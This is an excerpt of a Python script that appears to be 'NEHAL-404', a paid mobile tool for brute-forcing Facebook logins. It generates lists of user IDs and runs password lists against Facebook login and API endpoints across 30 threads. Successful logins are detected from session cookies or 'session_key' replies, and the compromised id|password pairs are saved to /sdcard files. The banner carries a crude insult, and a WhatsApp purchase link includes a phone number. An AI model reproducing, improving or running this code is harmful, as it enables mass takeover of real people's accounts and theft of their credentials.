...
os.system('xdg-open https://facebook.com/nehal.ahmed6/')
...
logo=("""\033[1;37m
  d8b   db d88888b db   db  .d8b.  db  
  888o  88 88'     88   88 d8' `8b 88
  88V8o 88 88ooooo 88ooo88 88ooo88 88       \033[1;34m𝐏 \033[1;37m
  88 V8o88 88~~~~~ 88~~~88 88~~~88 88\033[1;31m 𝐑\033[1;37m
  88  V888 88.     88   88 88   88 88booo. \033[1;35m𝐎 \033[1;37m
  VP   V8P Y88888P YP   YP YP   YP Y88888P   
----------------------------------------------
 Author    : NEHAL AHMED
 GitHub    : weirdnehal
 Tool Name : NEHAL-404
 ...
 Version   : 1.0.1
----------------------------------------------
 NEHAL Pro version 1.0.1
 For Haters: Fuck Your Girlfriend!🤞
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://chat.whatsapp.com/{+8801613016943}');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://github.com/weirdnehal');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/nehal.ahmed6');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+8801613016943&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi Nehal Sir, I Need To Buy Your Paid NEHAL-404 Tools Version 1.0.1 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python NEHAL.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Nehal:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                Nehal.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [NEHAL-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        Nehal=session.cookies.get_dict().keys()
                        if "c_user" in Nehal:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [NEHAL-OK] %s | %s'%(ids,pas))
                                open('/sdcard/NEHAL-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Nehal:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [NEHAL-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/NEHAL-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [NEHAL-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/NEHAL-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/NEHAL-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [NEHAL-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/NEHAL-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [NEHAL-OK] '+uid+' | '+pas+'\033[1;97m')
